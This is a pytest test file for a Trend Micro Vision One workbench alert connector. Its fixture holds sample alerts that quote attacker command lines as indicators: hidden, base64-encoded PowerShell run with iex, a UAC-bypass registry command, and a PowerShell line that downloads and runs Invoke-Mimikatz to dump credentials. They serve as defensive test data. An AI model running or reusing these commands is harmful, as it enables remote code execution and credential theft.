import time
from datetime import datetime, timezone
from unittest.mock import MagicMock, Mock, patch

import pytest
import requests_mock

from trendmicro_modules import TrendMicroModule
from trendmicro_modules.trigger_vision_one_workbench import TrendMicroVisionOneWorkbenchConnector


@pytest.fixture
def trigger(symphony_storage):
    module = TrendMicroModule()
    trigger = TrendMicroVisionOneWorkbenchConnector(module=module, data_path=symphony_storage)

    trigger.push_events_to_intakes = MagicMock()
    trigger.configuration = {
        "base_url": "https://api.xdr.trendmicro.com",
        "api_key": "01234556789abcdef",
        "intake_key": "intake_key",
    }
    trigger.log = MagicMock()
    trigger.log_exception = MagicMock()

    return trigger


@pytest.fixture
def message_1():
    return {
        "totalCount": 2,
        "count": 2,
        "items": [
            {
                "schemaVersion": "1.12",
                "id": "WB-9002-20220906-00022",
                "investigationStatus": "New",
                "status": "Open",
                "investigationResult": "No Findings",
                "workbenchLink": "https://THE_WORKBENCH_URL",
                "alertProvider": "SAE",
                "modelId": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                "model": "Privilege Escalation via UAC Bypass",
                "modelType": "preset",
                "score": 64,
                "severity": "high",
                "firstInvestigatedDateTime": "2022-10-06T02:30:31Z",
                "createdDateTime": "2022-09-06T02:49:31Z",
                "updatedDateTime": "2022-09-06T02:49:48Z",
                "incidentId": "IC-1-20230706-00001",
                "caseId": "CL-1-20230706-00001",
                "ownerIds": ["12345678-1234-1234-1234-123456789012"],
                "impactScope": {
                    "desktopCount": 1,
                    "serverCount": 0,
                    "accountCount": 1,
                    "emailAddressCount": 1,
                    "containerCount": 1,
                    "cloudIdentityCount": 1,
                    "entities": [
                        {
                            "entityType": "account",
                            "entityValue": "shockwave\\sam",
                            "entityId": "shockwave\\sam",
                            "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                            "relatedIndicatorIds": [],
                            "provenance": ["Alert"],
                        },
                        {
                            "entityType": "host",
                            "entityValue": {
                                "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                                "name": "nimda",
                                "ips": ["10.10.58.51"],
                            },
                            "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                            "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                            "managementScopeInstanceId": "1babc299-52de-44f4-a1d2-8a224f391eee",
                            "managementScopePartitionKey": "4c1850c0-8a2a-4637-9f88-6afbab54dd79",
                            "relatedEntities": ["shockwave\\sam"],
                            "relatedIndicatorIds": [1, 2, 3, 4, 5, 6, 7, 8],
                            "provenance": ["Alert"],
                        },
                        {
                            "entityType": "emailAddress",
                            "entityValue": "support@pctutordetroit.com",
                            "entityId": "SUPPORT@PCTUTORDETROIT.COM",
                            "relatedEntities": [],
                            "relatedIndicatorIds": [],
                            "provenance": ["Alert"],
                        },
                        {
                            "entityType": "container",
                            "entityValue": "k8s_democon_longrunl_default_09451f51-7124-4aa5-a5c4-ada24efe9da9_0",
                            "entityId": "7d1e00176d78b2b1db0744a187314bf2ce39f3a7d43137c366ae6785e8a4f496",
                            "relatedEntities": [],
                            "relatedIndicatorIds": [],
                            "provenance": ["Alert"],
                        },
                        {
                            "entityType": "cloudIdentity",
                            "entityValue": "arn:aws:sts::985266316733:assumed-role/aad-admin/steven_hung",
                            "entityId": "arn:aws:sts::985266316733:assumed-role/aad-admin/steven_hung",
                            "relatedEntities": [],
                            "relatedIndicatorIds": [],
                            "provenance": ["Alert"],
                        },
                    ],
                },
                "description": "A user bypassed User Account Control (UAC) to gain higher-level permissions.",
                "matchedRules": [
                    {
                        "id": "25d96e5d-cb69-4935-ae27-43cc0cdca1cc",
                        "name": "(T1088) Bypass UAC via shell open registry",
                        "matchedFilters": [
                            {
                                "id": "ac200e74-8309-463e-ad6b-a4c16a3a377f",
                                "name": "Bypass UAC Via Shell Open Default Registry",
                                "matchedDateTime": "2022-09-05T03:53:49.802Z",
                                "mitreTechniqueIds": ["T1112", "V9.T1112", "V9.T1548.002"],
                                "matchedEvents": [
                                    {
                                        "uuid": "a32599b7-c0c9-45ed-97bf-f2be7679fb00",
                                        "matchedDateTime": "2022-09-05T03:53:49.802Z",
                                        "type": "TELEMETRY_REGISTRY",
                                    }
                                ],
                            },
                            {
                                "id": "857b6396-da29-44a8-bc11-25298e646795",
                                "name": "Bypass UAC Via Shell Open Registry",
                                "matchedDateTime": "2022-09-05T03:53:49.802Z",
                                "mitreTechniqueIds": ["T1112", "T1088", "V9.T1112", "V9.T1548.002"],
                                "matchedEvents": [
                                    {
                                        "uuid": "4c456bbb-2dfc-40a5-b298-799a0ccefc01",
                                        "matchedDateTime": "2022-09-05T03:53:49.802Z",
                                        "type": "TELEMETRY_REGISTRY",
                                    }
                                ],
                            },
                        ],
                    }
                ],
                "indicators": [
                    {
                        "id": 1,
                        "type": "command_line",
                        "field": "processCmd",
                        "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["ac200e74-8309-463e-ad6b-a4c16a3a377f"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 2,
                        "type": "command_line",
                        "field": "parentCmd",
                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....XggJHNjQjs=')); iex $r;  ",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["ac200e74-8309-463e-ad6b-a4c16a3a377f"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 3,
                        "type": "command_line",
                        "field": "processCmd",
                        "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["857b6396-da29-44a8-bc11-25298e646795"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 4,
                        "type": "command_line",
                        "field": "parentCmd",
                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....jY0KTtpZXggJHNjQjs=')); iex $r;  ",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["857b6396-da29-44a8-bc11-25298e646795"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 5,
                        "type": "registry_key",
                        "field": "objectRegistryKeyHandle",
                        "value": "hkcr\\ms-settings\\shell\\open\\command",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["ac200e74-8309-463e-ad6b-a4c16a3a377f"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 6,
                        "type": "registry_key",
                        "field": "objectRegistryKeyHandle",
                        "value": "hkcr\\ms-settings\\shell\\open\\command",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["857b6396-da29-44a8-bc11-25298e646795"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 7,
                        "type": "registry_value",
                        "field": "objectRegistryValue",
                        "value": "delegateexecute",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["857b6396-da29-44a8-bc11-25298e646795"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 8,
                        "type": "registry_value_data",
                        "field": "objectRegistryData",
                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["ac200e74-8309-463e-ad6b-a4c16a3a377f"],
                        "provenance": ["Alert"],
                    },
                ],
            },
            {
                "schemaVersion": "1.12",
                "id": "WB-9002-20220906-00023",
                "investigationStatus": "New",
                "status": "Open",
                "investigationResult": "No Findings",
                "workbenchLink": "https://THE_WORKBENCH_URL",
                "alertProvider": "SAE",
                "modelId": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                "model": "Credential Dumping via Mimikatz",
                "modelType": "preset",
                "score": 64,
                "severity": "high",
                "createdDateTime": "2022-09-06T02:49:30Z",
                "updatedDateTime": "2022-09-06T02:49:50Z",
                "impactScope": {
                    "desktopCount": 1,
                    "serverCount": 0,
                    "accountCount": 1,
                    "emailAddressCount": 0,
                    "containerCount": 0,
                    "cloudIdentityCount": 0,
                    "entities": [
                        {
                            "entityType": "account",
                            "entityValue": "shockwave\\sam",
                            "entityId": "shockwave\\sam",
                            "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                            "relatedIndicatorIds": [],
                            "provenance": ["Alert"],
                        },
                        {
                            "entityType": "host",
                            "entityValue": {
                                "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                                "name": "nimda",
                                "ips": ["10.10.58.51"],
                            },
                            "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                            "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                            "managementScopeInstanceId": "1babc299-52de-44f4-a1d2-8a224f391eee",
                            "managementScopePartitionKey": "4c1850c0-8a2a-4637-9f88-6afbab54dd79",
                            "relatedEntities": ["shockwave\\sam"],
                            "relatedIndicatorIds": [1, 2, 3, 4, 5, 6, 7],
                            "provenance": ["Alert"],
                        },
                    ],
                },
                "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
                "matchedRules": [
                    {
                        "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
                        "name": "Potential Credential Dumping via Mimikatz",
                        "matchedFilters": [
                            {
                                "id": "49d327c4-361f-43f0-b66c-cab433495e42",
                                "name": "Possible Credential Dumping via Mimikatz",
                                "matchedDateTime": "2022-09-05T03:53:57.199Z",
                                "mitreTechniqueIds": ["V9.T1003.001", "V9.T1059.003", "V9.T1212"],
                                "matchedEvents": [
                                    {
                                        "uuid": "e168a6e5-27b1-462b-ad3e-5146df4e6aa5",
                                        "matchedDateTime": "2022-09-05T03:53:57.199Z",
                                        "type": "TELEMETRY_PROCESS",
                                    }
                                ],
                            }
                        ],
                    }
                ],
                "indicators": [
                    {
                        "id": 1,
                        "type": "command_line",
                        "field": "objectCmd",
                        "value": 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe "iex (new-object net.webclient).downloadstring(" "https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds"',
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 2,
                        "type": "command_line",
                        "field": "processCmd",
                        "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa=",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 3,
                        "type": "command_line",
                        "field": "parentCmd",
                        "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 4,
                        "type": "file_sha1",
                        "field": "objectFileHashSha1",
                        "value": "1B3B40FBC889FD4C645CC12C85D0805AC36BA254",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 5,
                        "type": "fullpath",
                        "field": "objectFilePath",
                        "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 6,
                        "type": "fullpath",
                        "field": "processFilePath",
                        "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                        "provenance": ["Alert"],
                    },
                    {
                        "id": 7,
                        "type": "text",
                        "field": "endpointHostName",
                        "value": "Nimda",
                        "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                        "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                        "provenance": ["Alert"],
                    },
                ],
            },
        ],
    }


def test_fetch_events(trigger, message_1):
    trigger.cursor.offset = datetime(year=2024, month=11, day=1, tzinfo=timezone.utc)
    with patch(
        "trendmicro_modules.trigger_vision_one_base.time"
    ) as mock_time, requests_mock.Mocker() as mock_requests:
        mock_requests.register_uri("GET", "https://api.xdr.trendmicro.com/v3.0/workbench/alerts", json=message_1)

        batch_duration = 16  # the batch lasts 16 seconds
        start_time = 1666711174.0
        end_time = start_time + batch_duration
        mock_time.time.side_effect = [start_time, end_time]

        trigger.next_batch()

        assert trigger.push_events_to_intakes.call_count == 1
        assert mock_time.sleep.call_count == 1


def test_long_next_batch_should_not_sleep(trigger, message_1):
    trigger.cursor.offset = datetime(year=2024, month=11, day=1, tzinfo=timezone.utc)
    with patch(
        "trendmicro_modules.trigger_vision_one_base.time"
    ) as mock_time, requests_mock.Mocker() as mock_requests:
        mock_requests.register_uri("GET", "https://api.xdr.trendmicro.com/v3.0/workbench/alerts", json=message_1)

        batch_duration = trigger.configuration.frequency + 20  # the batch lasts more than the frequency
        start_time = 1666711174.0
        end_time = start_time + batch_duration
        mock_time.time.side_effect = [start_time, end_time]

        trigger.next_batch()

        assert trigger.push_events_to_intakes.call_count == 1
        assert mock_time.sleep.call_count == 0
